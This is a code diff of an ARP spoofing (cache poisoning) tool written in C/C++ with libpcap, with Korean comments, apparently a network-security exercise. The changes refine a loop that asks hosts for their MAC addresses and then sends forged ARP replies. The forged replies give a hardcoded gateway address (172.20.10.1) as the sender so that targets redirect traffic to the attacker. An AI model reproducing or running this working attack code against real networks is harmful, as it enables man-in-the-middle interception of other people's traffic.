@@ -14,7 +14,7 @@ void usage() {
 typedef struct ARP_INFECTION_PACKET {
 	ETHERNET_HDR eth_h;
 	ARP_HDR arp_h;
-} __attribute__((packed)) ARP_PACKET;
+} __attribute__((packed)) ARP_PACKET;	/* wireshark로 확인 후 구조체패딩 해제 */
 
 void receive_arp(int c, char* sender_ip){
 	ARP_PACKET *packet = new ARP_PACKET;
@@ -46,14 +46,10 @@ ARP_PACKET send_arp_preparing(
 	stringmac_to_bytemac(target_mac, packet.arp_h.target_mac_address); 	// Target MAC address
 
 	printf("Sender IP: %hhu.%hhu.%hhu.%hhu, Target IP: %hhu.%hhu.%hhu.%hhu\n",
-		packet.arp_h.sender_ip_address & 0xFF,
-		(packet.arp_h.sender_ip_address >> 8) & 0xFF,
-		(packet.arp_h.sender_ip_address >> 16) & 0xFF,
-		(packet.arp_h.sender_ip_address >> 24) & 0xFF,
-		packet.arp_h.target_ip_address & 0xFF,
-		(packet.arp_h.target_ip_address >> 8) & 0xFF,
-		(packet.arp_h.target_ip_address >> 16) & 0xFF,
-		(packet.arp_h.target_ip_address >> 24) & 0xFF);
+		packet.arp_h.sender_ip_address & 0xFF, (packet.arp_h.sender_ip_address >> 8) & 0xFF,
+		(packet.arp_h.sender_ip_address >> 16) & 0xFF, (packet.arp_h.sender_ip_address >> 24) & 0xFF,
+		packet.arp_h.target_ip_address & 0xFF, (packet.arp_h.target_ip_address >> 8) & 0xFF,
+		(packet.arp_h.target_ip_address >> 16) & 0xFF, (packet.arp_h.target_ip_address >> 24) & 0xFF);
 	printf("Sender MAC: %u, Target MAC: %u\n", packet.arp_h.sender_mac_address, packet.arp_h.target_mac_address);
 
 	return packet;
@@ -75,7 +71,7 @@ int main(int argc, char* argv[]) {
 
 	while (1){
 		for(int i = 2; i < argc; i += 2) {
-			/* who is <target_ip>? request */
+			/* who has <target_ip>? 요청 */
 			ARP_PACKET tip_req_packet = send_arp_preparing(
 				"90:de:80:d5:a0:66", "ff:ff:ff:ff:ff:ff",
 				0x0001,
@@ -86,9 +82,11 @@ int main(int argc, char* argv[]) {
 				return -1;
 			}
 
-			/* who is <target_ip>? wait and receive */
-			ARP_PACKET* tip_res_packet = nullptr;
-			while (true) {
+			/* <target_ip> is <target_mac> 응답 */
+			ARP_PACKET* tip_res_packet = NULL;
+			char sender_ip[16];
+			int j = 0;
+			for (j = 0; j < 10; j++) {
 				struct pcap_pkthdr* header;
 				const u_char* packet;
 				int res = pcap_next_ex(pcap, &header, &packet);
@@ -98,32 +96,29 @@ int main(int argc, char* argv[]) {
 					break;
 				}
 				printf("%u bytes captured\n", header->caplen);
-				/* is arp? */
 
-				char target_ip[16];
-				byteip_to_stringip(&tip_res_packet->arp_h.target_ip_address, target_ip);
+				tip_res_packet = (ARP_PACKET*) packet; /* pointer casting */
 
+				byteip_to_stringip(&tip_res_packet->arp_h.sender_ip_address, sender_ip);
 				tip_res_packet = reinterpret_cast<ARP_PACKET*>(const_cast<u_char*>(packet));
-				if (ntohs(tip_res_packet->eth_h.ether_type) == 0x0806 &&
-					ntohs(tip_res_packet->arp_h.operation) == 2 &&
-					strncmp(target_ip, argv[i + 1], 16) == 0) {
+				if (ntohs(tip_res_packet->eth_h.ether_type) == 0x0806 && ntohs(tip_res_packet->arp_h.operation) == 2 && strncmp(sender_ip, argv[i + 1], 16) == 0) {
 					printf("Received ARP reply from %s\n", argv[i + 1]);
 					break;
 				}
 			}
+			if (j == 10) continue;
 
 			char dst_mac[18], src_mac[18], sender_mac[18], target_mac[18];
 			bytemac_to_stringmac(tip_res_packet->eth_h.ether_dhost, dst_mac);
 			bytemac_to_stringmac(tip_res_packet->eth_h.ether_shost, src_mac);
-			bytemac_to_stringmac(tip_res_packet->arp_h.sender_mac_address, sender_mac);
+			// bytemac_to_stringmac(tip_res_packet->arp_h.sender_mac_address, sender_mac);
 			bytemac_to_stringmac(tip_res_packet->arp_h.target_mac_address, target_mac);
 
 			ARP_PACKET packet = send_arp_preparing(
 				dst_mac, src_mac,
 				0x0002,
-				argv[i], argv[i+1],
-				sender_mac, target_mac);
-			/* send arp reply */
+				"172.20.10.1", argv[i+1], /* gateway 주소 공격 주소 대신 넣기 */
+				dst_mac, target_mac);
 			if (pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(packet)) != 0) {
 				fprintf(stderr, "send packet error: %s\n", pcap_geterr(pcap));
 				return -1;
